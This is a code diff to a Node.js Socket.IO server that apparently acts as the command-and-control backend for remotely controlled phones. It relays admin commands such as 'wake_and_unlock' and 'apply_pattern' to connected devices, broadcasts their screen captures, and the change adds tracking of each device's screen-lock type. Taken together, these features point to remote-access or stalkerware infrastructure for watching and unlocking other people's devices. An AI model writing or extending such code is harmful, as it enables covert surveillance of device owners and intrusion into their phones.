@@ -16,12 +16,10 @@ const PORT = process.env.PORT || 8080;
 
 let devices = {};
 
-// केवल मुख्य panel.html को सर्व करें
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'panel.html'));
 });
 
-// Socket.IO लॉजिक
 io.on('connection', (socket) => {
     socket.on('admin_join', () => {
         socket.emit('device_list', Object.values(devices));
@@ -30,12 +28,7 @@ io.on('connection', (socket) => {
     socket.on('command_to_device', (data) => {
         const device = devices[data.deviceId];
         if (device && device.socketId) {
-            // नए कमांड्स को भी फॉरवर्ड करें
-            if (data.action === 'wake_and_unlock' || data.action === 'apply_pattern') {
-                io.to(device.socketId).emit(data.action, data.payload);
-            } else {
-                io.to(device.socketId).emit(data.action, data.payload);
-            }
+            io.to(device.socketId).emit(data.action, data.payload);
         }
     });
 
@@ -48,10 +41,10 @@ io.on('connection', (socket) => {
         io.emit('screen_update', data);
     });
 
-    // हार्टबीट
     socket.on('heartbeat', (data) => {
         if (data && data.deviceId && devices[data.deviceId]) {
             devices[data.deviceId].battery = data.battery;
+            devices[data.deviceId].lockType = data.lockType || "none";
             devices[data.deviceId].lastSeen = new Date().toISOString();
         }
     });
@@ -72,5 +65,5 @@ io.on('connection', (socket) => {
 });
 
 server.listen(PORT, () => {
-    console.log(`🚀 सर्वर पोर्ट ${PORT} पर "अटूट कनेक्शन" मोड में तैयार है!`);
+    console.log(`🚀 Server running on port ${PORT}`);
 });
